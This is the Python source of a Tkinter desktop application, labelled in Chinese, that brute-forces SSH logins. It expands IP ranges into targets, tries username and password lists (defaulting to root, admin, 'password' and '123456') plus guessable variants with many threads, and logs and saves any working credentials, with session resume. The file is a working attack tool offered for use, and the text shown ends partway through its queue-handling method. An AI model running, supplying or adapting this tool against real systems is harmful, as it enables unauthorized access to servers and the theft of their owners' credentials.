#!/usr/bin/python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import subprocess
import sys
import os
import socket
import threading
import json
import csv
import ipaddress
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError
from queue import Queue

# --- 依赖检查与安装 ---
try:
    import paramiko
except ImportError:
    paramiko = None
# tqdm is not directly used by GUI, but original script had it.
# We'll keep the check minimal for GUI context.

REQUIRED_PACKAGES = {
    "paramiko": "paramiko",
}

# --- ANSI颜色代码 (Not used in GUI output directly) ---
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- 全局变量与锁 (from original script) ---
already_cracked_set = set()
completed_ip_user_set = set()
progress_lock = threading.Lock()
stop_flags_for_ip_user = {} # key: (ip, user), value: threading.Event()

# --- 依赖检查与安装 (Simplified for GUI context) ---
def check_and_install_dependencies_gui(parent_window=None):
    global paramiko
    missing_packages = []
    if paramiko is None: missing_packages.append("paramiko")

    if missing_packages:
        msg = f"检测到以下缺失的依赖包: {', '.join(missing_packages)}\n是否尝试使用pip自动安装这些依赖?"
        if parent_window:
            confirm = messagebox.askyesno("依赖缺失", msg, parent=parent_window)
        else: # Fallback if no parent
            confirm = input(f"依赖缺失: {', '.join(missing_packages)}. 自动安装? (y/n): ").strip().lower() == 'y'

        if confirm:
            for pkg_name_key in missing_packages:
                original_pkg_name = REQUIRED_PACKAGES.get(pkg_name_key, pkg_name_key)
                try:
                    if parent_window: parent_window.update_idletasks() # Keep GUI responsive
                    # Log to console for now, GUI log area might not be ready
                    print(f"正在安装 {original_pkg_name}...")
                    subprocess.check_call([sys.executable, "-m", "pip", "install", original_pkg_name],
                                          stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
                    print(f"'{original_pkg_name}' 安装成功。请重新运行脚本。")
                    if parent_window:
                        messagebox.showinfo("安装成功", f"'{original_pkg_name}' 安装成功。请重新启动应用程序。", parent=parent_window)
                except subprocess.CalledProcessError as e:
                    err_msg = f"'{original_pkg_name}' 安装失败。\n请尝试手动安装 (例如: pip install {original_pkg_name}) 然后重新运行。"
                    print(err_msg)
                    if parent_window: messagebox.showerror("安装失败", err_msg, parent=parent_window)
                    sys.exit(1)
            # After successful install, typically need to restart
            sys.exit(0)
        else:
            err_msg = "用户选择不自动安装依赖。请手动安装缺失的依赖后重试。"
            print(err_msg)
            if parent_window: messagebox.showerror("依赖缺失", err_msg, parent=parent_window)
            sys.exit(1)
    # Re-import if they were installed (or already present)
    import paramiko
    return True


# --- File and list processing (from original script, minor changes for GUI logging) ---
def parse_ip_input(ip_input_str, log_queue=None):
    ips = set()
    def _log(message, level="INFO"):
        if log_queue: log_queue.put({"type": "log", "level": level, "message": message})
        else: print(f"[{level}] {message}")

    if os.path.isfile(ip_input_str):
        try:
            with open(ip_input_str, "r", encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        try:
                            network = ipaddress.ip_network(line, strict=False)
                            for ip_obj in network.hosts(): ips.add(str(ip_obj))
                            if network.num_addresses == 1: ips.add(str(network.network_address))
                        except ValueError:
                            if '-' in line:
                                try:
                                    start_ip_str, end_ip_str = line.split('-',1)
                                    start_ip = ipaddress.ip_address(start_ip_str.strip())
                                    end_ip = ipaddress.ip_address(end_ip_str.strip())
                                    if start_ip.version == end_ip.version:
                                        current_ip = start_ip
                                        while current_ip <= end_ip: ips.add(str(current_ip)); current_ip +=1
                                    else: _log(f"IP范围格式中IP版本不匹配 '{line}'", "WARNING")
                                except Exception as e_range: _log(f"无法解析IP范围 '{line}': {e_range}", "WARNING")
                            else: _log(f"无法解析IP条目 '{line}' (不是有效的IP, CIDR或范围)", "WARNING")
            if not ips: _log(f"IP文件 '{ip_input_str}' 为空或未包含有效IP。", "WARNING")
        except Exception as e:
            _log(f"读取IP文件 '{ip_input_str}' 时发生错误: {e}", "ERROR")
            return None
    else:
        try:
            network = ipaddress.ip_network(ip_input_str, strict=False)
            for ip_obj in network.hosts(): ips.add(str(ip_obj))
            if network.num_addresses == 1: ips.add(str(network.network_address))
        except ValueError:
            if '-' in ip_input_str:
                try:
                    start_ip_str, end_ip_str = ip_input_str.split('-',1)
                    start_ip = ipaddress.ip_address(start_ip_str.strip())
                    end_ip = ipaddress.ip_address(end_ip_str.strip())
                    if start_ip.version == end_ip.version:
                        current_ip = start_ip
                        while current_ip <= end_ip: ips.add(str(current_ip)); current_ip +=1
                    else: _log(f"IP范围格式中IP版本不匹配 '{ip_input_str}'", "WARNING")
                except Exception as e_range_direct:
                    _log(f"无法解析直接输入的IP范围 '{ip_input_str}': {e_range_direct}", "ERROR")
                    return None
            else:
                _log(f"无法将输入 '{ip_input_str}' 解析为有效的IP, CIDR, IP范围或文件路径。", "ERROR")
                return None
    if ips: _log(f"成功解析到 {len(ips)} 个唯一IP地址。")
    return sorted(list(ips))

def load_list_from_file(file_path, item_description="条目", log_queue=None):
    def _log(message, level="INFO"):
        if log_queue: log_queue.put({"type": "log", "level": level, "message": message})
        else: print(f"[{level}] {message}")

    if not os.path.exists(file_path):
        _log(f"{item_description}文件 '{file_path}' 未找到。", "ERROR")
        return None
    items = []
    try:
        with open(file_path, "r", encoding='utf-8', errors='ignore') as f: # Added errors='ignore' for password files
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    items.append(line)
        if not items: _log(f"文件 '{file_path}' 为空或仅包含注释/空行。", "WARNING")
        else: _log(f"从 '{file_path}' 成功加载 {len(items)} 个{item_description}。")
        return items
    except Exception as e:
        _log(f"读取{item_description}文件 '{file_path}' 时发生错误: {e}", "ERROR")
        return None

def generate_mutated_passwords(username, ip): # Unchanged
    mutations = []
    if not username: return mutations
    mutations.append(username)
    mutations.append(username.capitalize())
    mutations.append(username + "123")
    mutations.append(username + "@123")
    mutations.append(username + str(datetime.now().year))
    if '.' in ip:
        parts = ip.split('.')
        if len(parts) > 1 and not parts[0].isdigit():
             mutations.append(username + "@" + parts[0])
             mutations.append(parts[0].capitalize() + "123")
    return list(set(mutations))

def ssh_check(ip, port, user, password, ssh_timeout, stop_event=None): # Unchanged, good as is
    if stop_event and stop_event.is_set():
        return "TASK_CANCELLED_EXTERNALLY", None

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    error_detail = ""
    try:
        client.connect(ip, port, user, password, timeout=ssh_timeout, allow_agent=False, look_for_keys=False)
        return "SUCCESS", password
    except paramiko.AuthenticationException: return "AUTH_FAILED", None
    except paramiko.BadHostKeyException as e: error_detail = f"主机密钥错误: {type(e).__name__}"; return "HOST_KEY_ERROR", error_detail
    except paramiko.ChannelException as e: error_detail = f"通道错误: {type(e).__name__}"; return "CHANNEL_ERROR", error_detail
    except paramiko.PasswordRequiredException as e: error_detail = f"需要密钥密码: {type(e).__name__}"; return "KEY_PASSWORD_NEEDED", error_detail
    except socket.timeout: return "TIMEOUT", None
    except (paramiko.SSHException, socket.error, OSError, EOFError) as e:
        err_type_name = type(e).__name__
        if isinstance(e, socket.error):
            if hasattr(e, 'errno'):
                if e.errno == 111 or "Connection refused" in str(e): return "CONNECTION_REFUSED", None
                elif e.errno == 113 or "No route to host" in str(e): return "NO_ROUTE_TO_HOST", None
                elif e.errno == 101 or "Network is unreachable" in str(e): return "NETWORK_UNREACHABLE", None
                error_detail = f"{err_type_name}(errno {e.errno})"
            else: error_detail = err_type_name
        elif isinstance(e, paramiko.SSHException) and "Error reading SSH protocol banner" in str(e): return "BANNER_ERROR", None
        elif isinstance(e, paramiko.SSHException) and ("Unable to connect" in str(e) or "Socket is closed" in str(e)): return "CONNECTION_FAILED_GENERIC_SSH", str(e)
        else: error_detail = f"{err_type_name}: {str(e)[:50]}"
        return "CONNECTION_ERROR_DETAILED", error_detail
    finally:
        if client: client.close()

# --- Session save/load (minor changes for GUI logging) ---
SESSION_FILE = "ssh_brute_session_gui.json"

def save_session(log_queue=None):
    with progress_lock:
        data_to_save = {
            "already_cracked": [list(item) for item in already_cracked_set], # Convert tuples to lists for JSON
            "completed_ip_user": [list(item) for item in completed_ip_user_set]
        }
    try:
        with open(SESSION_FILE, "w", encoding="utf-8") as f:
            json.dump(data_to_save, f, indent=2)
        if log_queue: log_queue.put({"type": "log", "message": f"会话已保存到 {SESSION_FILE}"})
    except Exception as e:
        if log_queue: log_queue.put({"type": "log", "level":"ERROR", "message": f"保存会话失败: {e}"})

def load_session(log_queue=None):
    global already_cracked_set, completed_ip_user_set
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                loaded_cracked = set(tuple(item) for item in data.get("already_cracked", []))
                loaded_completed = set(tuple(item) for item in data.get("completed_ip_user", []))
                with progress_lock:
                    already_cracked_set.update(loaded_cracked)
                    completed_ip_user_set.update(loaded_completed)
                if log_queue:
                    log_queue.put({"type": "log",
                                   "message": f"从 {SESSION_FILE} 加载会话: "
                                              f"{len(loaded_cracked)} 个已破解, {len(loaded_completed)} 个已完成IP-用户对。"})
                return True # Indicate session was loaded
        except Exception as e:
            if log_queue: log_queue.put({"type": "log", "level":"ERROR",
                                   "message": f"加载会话失败: {e}。将开始新会话。"})
            try: os.rename(SESSION_FILE, SESSION_FILE + ".corrupted_" + str(int(time.time())))
            except: pass
    return False


# --- Main execution logic adapted for GUI worker thread ---
def run_brute_force_worker(params, results_queue, stop_event_global):
    global already_cracked_set, completed_ip_user_set, stop_flags_for_ip_user

    def _log_gui(message, level="INFO", type="log"):
        results_queue.put({"type": type, "level": level, "message": message})

    _log_gui("--- SSH爆破任务启动 ---")

    if params['resume']:
        load_session(results_queue)

    ip_list = parse_ip_input(params['ip_source'], results_queue)
    username_list_from_file = load_list_from_file(params['user_file'], "用户名", results_queue) if params['user_file'] else []
    cli_users = [u.strip() for u in params['users_list'].split(',') if u.strip()] if params['users_list'] else []
    username_list = sorted(list(set(cli_users + username_list_from_file)))

    if not ip_list:
        _log_gui("IP列表为空，无法执行。", "ERROR")
        results_queue.put({"type": "finished", "message": "IP列表为空"})
        return
    if not username_list:
        _log_gui("用户名列表为空，无法执行。", "ERROR")
        results_queue.put({"type": "finished", "message": "用户名列表为空"})
        return

    stats = {
        "success": 0, "auth_failed": 0, "timeout":0, "conn_refused":0,
        "no_route":0, "net_unreach":0, "banner_err":0, "host_key_err":0,
        "conn_err_detailed": 0, "task_cancelled":0, "skipped_loaded":0,
        "conn_failed_generic_ssh": 0, "channel_error":0, "key_password_needed":0
    }
    successful_logins_details_for_file = [] # For saving to file

    num_passwords_in_file = 0
    if params['password_file']:
        try:
            with open(params['password_file'], "r", encoding='utf-8', errors='ignore') as pf_count:
                num_passwords_in_file = sum(1 for _line in pf_count if _line.strip() and not _line.strip().startswith("#"))
        except: pass

    estimated_pass_per_user = num_passwords_in_file + \
                              (len(generate_mutated_passwords("sample","1.2.3.4")) if params['mutate_passwords'] else 0)
    if params['passwords_list']:
        estimated_pass_per_user += len(params['passwords_list'].split(','))

    if estimated_pass_per_user == 0 and not params['password_file'] and not params['passwords_list']:
        _log_gui("未提供密码，无法执行爆破。", "ERROR")
        results_queue.put({"type": "finished", "message": "未提供密码"})
        return

    _log_gui(f"目标端口: {params['port']}, 最大线程数: {params['max_threads']}, SSH超时: {params['timeout']}s")

    tasks_to_submit = []
    for ip in ip_list:
        if stop_event_global.is_set(): break
        for user in username_list:
            if stop_event_global.is_set(): break
            ip_user_key = (ip, user)
            with progress_lock:
                if ip_user_key in already_cracked_set or ip_user_key in completed_ip_user_set:
                    stats["skipped_loaded"] += estimated_pass_per_user # Rough estimate
                    _log_gui(f"跳过已完成/破解的: {user}@{ip}", "DEBUG")
                    continue

            stop_event_for_this_user = threading.Event()
            stop_flags_for_ip_user[ip_user_key] = stop_event_for_this_user

            passwords_to_try_for_user = []
            if params['mutate_passwords']:
                mutated = generate_mutated_passwords(user, ip)
                for mpwd in mutated:
                    if mpwd: passwords_to_try_for_user.append(mpwd)
            if params['passwords_list']:
                for cpwd in params['passwords_list'].split(','):
                    if cpwd.strip(): passwords_to_try_for_user.append(cpwd.strip())

            current_pass_list_from_file = []
            if params['password_file']:
                # Load passwords for this user. Ideally, this load_list_from_file should be efficient.
                # For very large password files, this could be a bottleneck if called repeatedly.
                # Consider loading password file once outside the loops if it's static.
                # Here, assuming it's okay to load per user or manage caching if it becomes an issue.
                if not hasattr(run_brute_force_worker, 'global_password_list_from_file'):
                     run_brute_force_worker.global_password_list_from_file = load_list_from_file(params['password_file'], "密码", results_queue) or []
                current_pass_list_from_file = run_brute_force_worker.global_password_list_from_file

            all_passwords_for_user = list(dict.fromkeys(passwords_to_try_for_user + current_pass_list_from_file))

            for password_value in all_passwords_for_user:
                if stop_event_global.is_set() or stop_event_for_this_user.is_set(): break
                tasks_to_submit.append((ip, user, password_value, stop_event_for_this_user))
        else: continue # Inner loop (user) not broken
        break # Outer loop (ip) broken

    if not tasks_to_submit and not stop_event_global.is_set():
        _log_gui("没有可执行的尝试任务（可能所有目标都已在会话中完成或破解）。", "WARNING")
        results_queue.put({"type": "finished", "message": "无任务执行"})
        return
    if stop_event_global.is_set():
         _log_gui("任务准备阶段被中止。", "WARNING")
         results_queue.put({"type": "finished", "message": "任务中止"})
         return

    actual_total_tasks = len(tasks_to_submit)
    _log_gui(f"实际将要执行的尝试次数: {actual_total_tasks}")
    results_queue.put({"type": "progress_max", "value": actual_total_tasks})
    
    processed_tasks = 0
    session_save_interval = 300
    last_session_save_time = time.time()

    with ThreadPoolExecutor(max_workers=params['max_threads']) as executor:
        future_to_task_info = {
            executor.submit(ssh_check, ip, params['port'], user, password, params['timeout'], stop_event): (ip, user, password)
            for ip, user, password, stop_event in tasks_to_submit
            if not stop_event_global.is_set() and not stop_event.is_set() # Check before submitting
        }

        for future in as_completed(future_to_task_info):
            if stop_event_global.is_set():
                _log_gui("全局停止信号，取消剩余任务...", "INFO")
                for f_cancel in future_to_task_info: # Cancel pending futures
                    if not f_cancel.done(): f_cancel.cancel()
                break

            processed_tasks += 1
            results_queue.put({"type": "progress_update", "value": processed_tasks})

            ip_orig, user_orig, pass_orig = future_to_task_info[future]
            ip_user_key_orig = (ip_orig, user_orig)
            
            # Check if this specific IP-User combo was stopped (e.g., found a password)
            if ip_user_key_orig in stop_flags_for_ip_user and stop_flags_for_ip_user[ip_user_key_orig].is_set():
                if future.running() : future.cancel() # If it's running, try to cancel
                # If already completed, process its result below but note it might be a late result for an already cracked pair
            
            try:
                status, detail = future.result()
                result_data = {"ip": ip_orig, "port": params['port'], "user": user_orig,
                               "password": detail if status == "SUCCESS" else pass_orig, # Show attempted pass on fail
                               "status_code": status, "status_detail": detail or status}

                if status == "SUCCESS":
                    stats["success"] += 1
                    result_data["password"] = detail # Ensure correct password for success
                    successful_logins_details_for_file.append({
                        "ip": ip_orig, "port": params['port'], "user": user_orig, "password": detail
                    })
                    _log_gui(f"[破解成功!] IP: {ip_orig}:{params['port']} - 用户: {user_orig}, 密码: {detail}", "SUCCESS")
                    with progress_lock: already_cracked_set.add(ip_user_key_orig)
                    if ip_user_key_orig in stop_flags_for_ip_user:
                        stop_flags_for_ip_user[ip_user_key_orig].set()
                
                elif status == "AUTH_FAILED": stats["auth_failed"] += 1
                elif status == "TIMEOUT": stats["timeout"] += 1
                elif status == "CONNECTION_REFUSED": stats["conn_refused"] += 1
                elif status == "NO_ROUTE_TO_HOST": stats["no_route"] += 1
                elif status == "NETWORK_UNREACHABLE": stats["net_unreach"] += 1
                elif status == "BANNER_ERROR": stats["banner_err"] += 1
                elif status == "HOST_KEY_ERROR": stats["host_key_err"] +=1; _log_gui(f"主机密钥错误: {ip_orig} - {user_orig} - {detail}", "WARNING")
                elif status == "CONNECTION_FAILED_GENERIC_SSH": stats["conn_failed_generic_ssh"] +=1
                elif status == "CHANNEL_ERROR": stats["channel_error"] +=1
                elif status == "KEY_PASSWORD_NEEDED": stats["key_password_needed"] +=1
                elif status == "CONNECTION_ERROR_DETAILED": stats["conn_err_detailed"] +=1
                elif status == "TASK_CANCELLED_EXTERNALLY": stats["task_cancelled"] +=1
                
                results_queue.put({"type": "result", "data": result_data})

            except CancelledError:
                stats["task_cancelled"] +=1
                _log_gui(f"任务 ({ip_orig}, {user_orig}, ****) 被取消。", "INFO")
                results_queue.put({"type": "result", "data": {
                    "ip": ip_orig, "port": params['port'], "user": user_orig, "password": pass_orig,
                    "status_code": "TASK_CANCELLED", "status_detail": "任务被取消"
                }})
            except Exception as exc_f:
                _log_gui(f"处理任务 ({ip_orig}, {user_orig}) 结果时意外错误: {exc_f}", "ERROR")
                stats["conn_err_detailed"] += 1
                results_queue.put({"type": "result", "data": {
                    "ip": ip_orig, "port": params['port'], "user": user_orig, "password": pass_orig,
                    "status_code": "PROCESSING_ERROR", "status_detail": str(exc_f)
                }})

            current_time = time.time()
            if current_time - last_session_save_time > session_save_interval:
                save_session(results_queue)
                last_session_save_time = current_time
    
    save_session(results_queue) # Final save

    # Cleanup: Clear global password list if it was populated
    if hasattr(run_brute_force_worker, 'global_password_list_from_file'):
        del run_brute_force_worker.global_password_list_from_file

    _log_gui("--- 所有尝试完毕 ---", "INFO")
    summary = "\n统计:\n"
    for key, value in stats.items():
        if value > 0: summary += f" - {key.replace('_', ' ').capitalize()}: {value}\n"
    _log_gui(summary, "INFO")
    
    results_queue.put({"type": "finished", "message": "测试完成", "successful_logins": successful_logins_details_for_file, "stats": stats})


class SSHBruteForceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SSH 凭据爆破工具 (GUI)")
        self.root.geometry("1000x750")

        self.results_queue = Queue()
        self.stop_event_global = threading.Event()
        self.worker_thread = None
        self.successful_logins_for_saving = []

        # Style
        self.style = ttk.Style()
        self.style.theme_use('clam') # Or 'alt', 'default', 'classic'

        self._create_widgets()
        self.root.after(100, self._process_queue)

    def _create_widgets(self):
        main_paned_window = ttk.PanedWindow(self.root, orient=tk.VERTICAL)
        main_paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # --- Top: Configuration Pane ---
        config_pane = ttk.Frame(main_paned_window, padding=10)
        main_paned_window.add(config_pane, weight=2) # Smaller weight for config

        # --- Middle: Controls and Progress Pane ---
        controls_progress_pane = ttk.Frame(main_paned_window, padding=(0,10,0,0))
        main_paned_window.add(controls_progress_pane, weight=0) # Minimal weight

        # --- Bottom: Results and Log Pane (itself a PanedWindow) ---
        results_log_paned_window = ttk.PanedWindow(main_paned_window, orient=tk.VERTICAL)
        main_paned_window.add(results_log_paned_window, weight=3) # Larger weight for results/log

        # --- Populate Configuration Pane ---
        config_frame = ttk.LabelFrame(config_pane, text="目标与凭据设置", padding=10)
        config_frame.pack(fill=tk.BOTH, expand=True)

        # Row 0: IP Source
        ttk.Label(config_frame, text="IP来源:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.ip_source_var = tk.StringVar()
        ttk.Entry(config_frame, textvariable=self.ip_source_var, width=40).grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        ttk.Button(config_frame, text="加载IP文件", command=lambda: self._load_file_to_var(self.ip_source_var, "IPs")).grid(row=0, column=2, padx=5, pady=5)

        # Row 1: User File / User List
        ttk.Label(config_frame, text="用户文件:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.user_file_var = tk.StringVar()
        ttk.Entry(config_frame, textvariable=self.user_file_var, width=40, state="readonly").grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        ttk.Button(config_frame, text="选择用户文件", command=lambda: self._load_file_to_var(self.user_file_var, "User File")).grid(row=1, column=2, padx=5, pady=5)
        ttk.Label(config_frame, text="或 用户列表 (逗号分隔):").grid(row=1, column=3, padx=5, pady=5, sticky="w")
        self.users_list_var = tk.StringVar(value="root,admin")
        ttk.Entry(config_frame, textvariable=self.users_list_var, width=30).grid(row=1, column=4, padx=5, pady=5, sticky="ew")

        # Row 2: Password File / Password List
        ttk.Label(config_frame, text="密码文件:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.password_file_var = tk.StringVar()
        ttk.Entry(config_frame, textvariable=self.password_file_var, width=40, state="readonly").grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        ttk.Button(config_frame, text="选择密码文件", command=lambda: self._load_file_to_var(self.password_file_var, "Password File")).grid(row=2, column=2, padx=5, pady=5)
        ttk.Label(config_frame, text="或 密码列表 (逗号分隔):").grid(row=2, column=3, padx=5, pady=5, sticky="w")
        self.passwords_list_var = tk.StringVar(value="password,123456")
        ttk.Entry(config_frame, textvariable=self.passwords_list_var, width=30).grid(row=2, column=4, padx=5, pady=5, sticky="ew")
        
        # Row 3: Port, Threads, Timeout
        ttk.Label(config_frame, text="端口:").grid(row=3, column=0, padx=5, pady=5, sticky="w")
        self.port_var = tk.IntVar(value=22)
        ttk.Spinbox(config_frame, from_=1, to_=65535, textvariable=self.port_var, width=7).grid(row=3, column=1, padx=5, pady=5, sticky="w")
        
        ttk.Label(config_frame, text="线程数:").grid(row=3, column=2, padx=(20,5), pady=5, sticky="w")
        self.max_threads_var = tk.IntVar(value=20)
        ttk.Spinbox(config_frame, from_=1, to_=200, textvariable=self.max_threads_var, width=7).grid(row=3, column=3, padx=5, pady=5, sticky="w")

        ttk.Label(config_frame, text="超时(s):").grid(row=3, column=4, padx=(20,5), pady=5, sticky="w")
        self.timeout_var = tk.DoubleVar(value=3.0)
        ttk.Spinbox(config_frame, from_=0.5, to_=60.0, increment=0.5, textvariable=self.timeout_var, width=7, format="%.1f").grid(row=3, column=5, padx=5, pady=5, sticky="w")

        # Row 4: Mutate, Resume
        self.mutate_passwords_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(config_frame, text="启用密码变异", variable=self.mutate_passwords_var).grid(row=4, column=0, columnspan=2, padx=5, pady=5, sticky="w")
        self.resume_session_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(config_frame, text="从会话恢复", variable=self.resume_session_var).grid(row=4, column=2, columnspan=2, padx=5, pady=5, sticky="w")

        config_frame.columnconfigure(1, weight=1)
        config_frame.columnconfigure(4, weight=1)


        # --- Populate Controls and Progress Pane ---
        self.start_button = ttk.Button(controls_progress_pane, text="开始爆破", command=self._start_brute_force)
        self.start_button.pack(side=tk.LEFT, padx=5, pady=5)
        self.stop_button = ttk.Button(controls_progress_pane, text="停止", command=self._stop_brute_force, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5, pady=5)
        self.save_results_button = ttk.Button(controls_progress_pane, text="保存成功结果", command=self._save_results_to_file, state=tk.DISABLED)
        self.save_results_button.pack(side=tk.LEFT, padx=5, pady=5)

        self.status_label_var = tk.StringVar(value="状态：待机")
        ttk.Label(controls_progress_pane, textvariable=self.status_label_var).pack(side=tk.LEFT, padx=10, pady=5, fill=tk.X, expand=True)
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(controls_progress_pane, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(side=tk.RIGHT, padx=10, pady=5, fill=tk.X, expand=True)


        # --- Populate Results and Log Pane ---
        # Results Treeview
        results_frame = ttk.LabelFrame(results_log_paned_window, text="爆破结果")
        results_log_paned_window.add(results_frame, weight=2) # More weight for results

        self.results_tree = ttk.Treeview(results_frame, columns=("ip", "port", "user", "password", "status", "details"), show="headings")
        self.results_tree.heading("ip", text="IP")
        self.results_tree.heading("port", text="端口")
        self.results_tree.heading("user", text="用户")
        self.results_tree.heading("password", text="密码")
        self.results_tree.heading("status", text="状态")
        self.results_tree.heading("details", text="详情")

        self.results_tree.column("ip", width=120, anchor="w")
        self.results_tree.column("port", width=50, anchor="center")
        self.results_tree.column("user", width=100, anchor="w")
        self.results_tree.column("password", width=120, anchor="w")
        self.results_tree.column("status", width=100, anchor="center")
        self.results_tree.column("details", width=250, anchor="w")

        vsb_tree = ttk.Scrollbar(results_frame, orient="vertical", command=self.results_tree.yview)
        hsb_tree = ttk.Scrollbar(results_frame, orient="horizontal", command=self.results_tree.xview)
        self.results_tree.configure(yscrollcommand=vsb_tree.set, xscrollcommand=hsb_tree.set)
        vsb_tree.pack(side=tk.RIGHT, fill=tk.Y)
        hsb_tree.pack(side=tk.BOTTOM, fill=tk.X)
        self.results_tree.pack(fill=tk.BOTH, expand=True)

        self.results_tree.tag_configure("SUCCESS", foreground="green")
        self.results_tree.tag_configure("AUTH_FAILED", foreground="red")
        self.results_tree.tag_configure("ERROR", foreground="orange") # For other errors
        self.results_tree.tag_configure("INFO", foreground="blue") # For cancellations or other info

        # Log ScrolledText
        log_frame = ttk.LabelFrame(results_log_paned_window, text="日志")
        results_log_paned_window.add(log_frame, weight=1) # Less weight for logs

        self.log_text_area = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=10, state=tk.DISABLED)
        self.log_text_area.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.log_text_area.tag_config("INFO", foreground="black")
        self.log_text_area.tag_config("SUCCESS", foreground="green")
        self.log_text_area.tag_config("WARNING", foreground="orange")
        self.log_text_area.tag_config("ERROR", foreground="red")
        self.log_text_area.tag_config("DEBUG", foreground="gray")

    def _load_file_to_var(self, target_var, title_suffix):
        filepath = filedialog.askopenfilename(
            title=f"选择{title_suffix}文件",
            filetypes=(("文本文件", "*.txt"), ("所有文件", "*.*"))
        )
        if filepath:
            target_var.set(filepath)
            self._log_message(f"{title_suffix}文件已选择: {filepath}", "INFO")

    def _log_message(self, message, level="INFO"):
        self.log_text_area.config(state=tk.NORMAL)
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text_area.insert(tk.END, f"[{timestamp}] [{level}] {message}\n", level.upper())
        self.log_text_area.see(tk.END) # Scroll to the end
        self.log_text_area.config(state=tk.DISABLED)

    def _start_brute_force(self):
        params = {
            'ip_source': self.ip_source_var.get(),
            'user_file': self.user_file_var.get(),
            'users_list': self.users_list_var.get(),
            'password_file': self.password_file_var.get(),
            'passwords_list': self.passwords_list_var.get(),
            'port': self.port_var.get(),
            'max_threads': self.max_threads_var.get(),
            'timeout': self.timeout_var.get(),
            'mutate_passwords': self.mutate_passwords_var.get(),
            'resume': self.resume_session_var.get(),
        }

        if not params['ip_source']:
            messagebox.showerror("输入错误", "请提供IP来源 (文件或直接输入)。")
            return
        if not params['user_file'] and not params['users_list']:
            messagebox.showerror("输入错误", "请提供用户来源 (文件或列表)。")
            return
        if not params['password_file'] and not params['passwords_list']:
            messagebox.showerror("输入错误", "请提供密码来源 (文件或列表)。")
            return

        self.results_tree.delete(*self.results_tree.get_children()) # Clear old results
        self.log_text_area.config(state=tk.NORMAL); self.log_text_area.delete("1.0", tk.END); self.log_text_area.config(state=tk.DISABLED)
        self.successful_logins_for_saving = []
        self.stop_event_global.clear()
        self.progress_var.set(0)
        
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.save_results_button.config(state=tk.DISABLED)
        self.status_label_var.set("状态：正在准备任务...")
        self._log_message("开始爆破任务...", "INFO")

        self.worker_thread = threading.Thread(target=run_brute_force_worker,
                                              args=(params, self.results_queue, self.stop_event_global),
                                              daemon=True)
        self.worker_thread.start()

    def _stop_brute_force(self):
        self._log_message("正在尝试停止爆破任务...", "WARNING")
        self.status_label_var.set("状态：正在中止...")
        self.stop_event_global.set()
        # Also set all individual stop flags, though worker checks global first
        for event in stop_flags_for_ip_user.values():
            event.set()
        self.stop_button.config(state=tk.DISABLED)

    def _process_queue(self):
        try:
            while True: # Process all messages in queue currently
                msg = self.results_queue.get_nowait()
                msg_type = msg.get("type")

                if msg_type == "log":
                    self._log_message(msg.get("message", ""), msg.get("level", "INFO"))
                elif msg_type == "progress_max":
                    self.progress_bar.config(maximum=msg.get("value", 100))
                    self.status_label_var.set(f"状态：已加载 {msg.get('value', 0)} 个任务")
                elif msg_type == "progress_update":
                    self.progress_var.set(msg.get("value", 0))
                    total = self.progress_bar.cget("maximum")
                    self.status_label_var.set(f"状态：进行中 {msg.get('value',0)}/{total}")
                elif msg_type == "result":
                    data = msg.get("data", {})
                    tag = "INFO"
                    if data.get("status_code") == "SUCCESS": tag = "SUCCESS"
                    elif data.get("status_code") == "AUTH_FAILED": tag = "AUTH_FAILED"
                    elif "ERROR" in data.get("status_code", "") or "FAILED" in data.get("status_code", ""): tag = "ERROR"
                    
                    self.results_tree.insert("", "end", values=(
                        data.get("ip", "-"), data.get("port", "-"), data.get("user", "-"),
                        "********" if data.get("status_code") != "SUCCESS" else data.get("password", "-"), # Hide non-successful passwords
                        data.get("status_code", "-"),
                        data.get("status_detail", "-")
                    ), tags=(tag,))
                    if self.results_tree.get_children(): self.results_tree.yview_moveto(1) # Scroll to bottom

                    if data.get("status_code") == "SUCCESS":
                         self.successful_logins_for_saving.append(data)

                elif msg_type == "finished":
                    self.start_button.config(state=tk.NORMAL)
                    self.stop_button.config(state=tk.DISABLED)
                    if self.successful_logins_for_saving:
                        self.save_results_button.config(state=tk.NORMAL)
                    
                    final_message = msg.get("message", "任务结束")
                    self.status_label_var.set(f"状态：{final_message}")
                    self._log_message(f"任务完成。{final_message}", "INFO")
                    if "stats" in msg:
                        stats_summary = "最终统计:\n"
                        for k,v in msg["stats"].items(): stats_summary += f"  {k}: {v}\n"
                        self._log_message(stats_summary, "INFO")
                    # Ensure progress bar is full or reflects actual if stopped
                    if not self.stop_event_global.is_set():
                         self.progress_var.set(self.progress_bar.cget("maximum"))
                    
                    # Clean up stop flags
                    stop_flags_for_ip_user.clear()


        except Exception as e: # queue.Empty or other
